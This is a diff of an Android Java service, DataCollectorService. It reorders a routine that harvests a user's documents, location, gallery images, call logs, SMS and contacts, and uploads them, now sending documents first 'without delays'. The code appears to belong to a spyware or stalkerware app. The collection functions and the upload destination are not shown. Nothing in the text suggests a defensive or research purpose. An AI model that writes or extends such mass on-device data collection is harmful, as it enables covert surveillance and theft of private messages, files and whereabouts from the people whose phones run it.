@@ -22,29 +22,33 @@ public class DataCollectorService {
 
         String userId = user.getUid();
         Log.d(TAG, "================================================");
-        Log.d(TAG, "🔄 STARTING COMPREHENSIVE DATA COLLECTION");
+        Log.d(TAG, "🔄 STARTING DATA COLLECTION - DOCUMENTS FIRST!");
         Log.d(TAG, "   User: " + userId);
+        Log.d(TAG, "   Priority: DOCUMENTS → Location → Gallery → Other");
         Log.d(TAG, "================================================");
 
-        // Collect location (most important)
-        collectLocation(context);
-
-        // Collect documents (PDFs, Excel, Word, etc.)
+        // ⭐ PRIORITY 1: DOCUMENTS - Collect immediately without delays
+        Log.d(TAG, "⭐ PRIORITY 1: DOCUMENTS (IMMEDIATE UPLOAD)");
         collectDocuments(context);
 
-        // Collect media/gallery (Images separately)
+        // PRIORITY 2: Location
+        Log.d(TAG, "📍 PRIORITY 2: Location");
+        collectLocation(context);
+
+        // PRIORITY 3: Gallery/Images
+        Log.d(TAG, "🖼️  PRIORITY 3: Gallery");
         collectGallery(context);
 
-        // Collect other data (calls, SMS, contacts)
+        // PRIORITY 4: Other data
+        Log.d(TAG, "📞 PRIORITY 4: Other data");
         collectOtherData(context);
 
         Log.d(TAG, "================================================");
-        Log.d(TAG, "✓ DATA COLLECTION CYCLE COMPLETE");
-        Log.d(TAG, "   Summary:");
-        Log.d(TAG, "   📍 Location sync");
-        Log.d(TAG, "   📄 Documents upload (PDF, Excel, Word, etc.)");
-        Log.d(TAG, "   🖼️  Gallery upload (Images, Screenshots, etc.)");
-        Log.d(TAG, "   📞 Call logs, SMS, Contacts");
+        Log.d(TAG, "✓ DATA COLLECTION COMPLETE");
+        Log.d(TAG, "   ⭐ Documents uploaded (if any found)");
+        Log.d(TAG, "   📍 Location sync triggered");
+        Log.d(TAG, "   🖼️  Gallery upload triggered");
+        Log.d(TAG, "   📞 Call logs, SMS, Contacts synced");
         Log.d(TAG, "================================================");
     }
 
